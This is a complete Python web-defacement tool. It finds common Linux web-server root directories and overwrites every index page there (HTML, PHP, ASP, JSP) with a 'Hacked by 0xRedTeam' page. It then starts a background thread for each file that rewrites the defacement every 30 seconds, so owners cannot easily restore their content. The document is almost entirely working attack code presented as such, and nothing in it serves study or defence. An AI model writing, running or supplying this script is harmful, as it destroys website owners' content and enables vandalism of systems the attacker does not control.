import os
import threading
import time

def find_web_roots():
    """Scans for common web server directories on a Linux system."""
    print("[*] Searching for web server root directories...")
    possible_roots = [
        '/var/www/html',
        '/srv/http',
        '/usr/share/nginx/html',
        '/var/www/vhosts',
        '/home/*/public_html', # For cPanel/shared hosting
        '/var/www'
    ]
    found_roots = []
    # This is a bit of a trick for globbing the user directories
    for root in possible_roots:
        if '*' in root:
            import glob
            found_roots.extend(glob.glob(root))
        elif os.path.isdir(root):
            found_roots.append(root)
    
    if found_roots:
        print(f"[+] Found potential web roots: {found_roots}")
    else:
        print("[-] No common web roots found.")
        
    return found_roots

def deface_and_persist(root_path, payload):
    """Recursively finds and defaces index files, then launches persistence threads."""
    index_files_to_target = ["index.html", "index.php", "index.htm", "home.html", "default.html", "main.html", "index.asp", "index.jsp"]
    defaced_targets = []

    for dirpath, _, filenames in os.walk(root_path):
        for fname in filenames:
            if fname in index_files_to_target:
                fpath = os.path.join(dirpath, fname)
                try:
                    # Try to set write permissions first
                    os.chmod(fpath, 0o644) 
                    with open(fpath, "w") as f:
                        f.write(payload)
                        print(f"[+] PWNED: {fpath}")
                        defaced_targets.append(fpath)
                except Exception as e:
                    print(f"[-] FAILED to deface {fpath}: {e}")

    if defaced_targets:
        print("\n[*] Initial defacement complete. Launching persistence threads...")
        for target in defaced_targets:
            # Start a daemon thread for each file to ensure it stays defaced
            thread = threading.Thread(target=persistent_overwrite, args=(target, payload), daemon=True)
            thread.start()
            print(f"[+] Persistence thread launched for: {target}")

def persistent_overwrite(target_file, payload, interval=30):
    """Continuously rewrites the payload to the target file."""
    while True:
        try:
            with open(target_file, 'w') as f:
                f.write(payload)
        except Exception as e:
            # If the file gets deleted or permissions change, we just print a quiet error and keep trying
            # print(f"[-] Persistence error on {target_file}: {e}")
            pass
        time.sleep(interval)


def main():
    payload = """
    <html>
    <head>
        <title>System Compromised</title>
        <style>
            body { background-color: #000; color: #0F0; font-family: 'Courier New', Courier, monospace; text-align: center; }
            h1 { text-shadow: 0 0 10px #0F0; }
            .container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
            .blink { animation: blink-animation 1s steps(2, start) infinite; }
            @keyframes blink-animation { to { visibility: hidden; } }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Hacked by 0xRedTeam</h1>
            <p>Your security is an illusion. We are the architects of your reality.</p>
            <p>System Owned.<span class="blink">_</span></p>
        </div>
    </body>
    </html>
    """

    web_roots = find_web_roots()
    if not web_roots:
        print("[!] Exiting. Could not find any targets.")
        return

    for root in web_roots:
        deface_and_persist(root, payload)
        
    print("\n[+] All persistence threads are running in the background. The system is under our control.")
    print("[+] Press Ctrl+C to exit this script (threads will terminate).")
    try:
        while True:
            time.sleep(1) # Keep main thread alive to let daemons run
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user. Bye.")

if __name__ == "__main__":
    main()
